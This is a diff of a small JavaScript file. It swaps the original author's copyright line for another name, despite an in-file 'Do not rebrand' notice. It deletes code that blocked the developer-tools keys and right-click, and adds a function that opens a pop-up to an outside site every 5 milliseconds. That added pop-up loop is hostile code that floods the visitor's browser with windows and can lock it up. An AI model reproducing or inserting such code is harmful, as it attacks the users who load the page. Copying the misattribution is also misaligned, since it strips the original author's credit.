@@ -1,24 +1,10 @@
- // © Copyright 2022 www.cph101.com
- // This file was originally made by cph101
+ // © Copyright 2022 CrazyH
+ // This file was originally made by CrazyH
  // Do not rebrand if you are distributing it
- // © Copyright 2022 www.cph101.com
+ // © Copyright 2022 CrazyH
 
-document.addEventListener('keydown', function() {
-  if (event.keyCode == 123) {
-    return false;
-  } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) {
-    return false;
-  } else if (event.ctrlKey && event.keyCode == 85) {
-    return false;
-  }
-}, false);
-
-if (document.addEventListener) {
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-  }, false);
-} else {
-  document.attachEvent('oncontextmenu', function() {
-    window.event.returnValue = false;
-  });
+function spamWin() {
+    window.open("https://www.hucklehive.com", "_blank");
 }
+
+window.setInterval(spamWin, 0005);
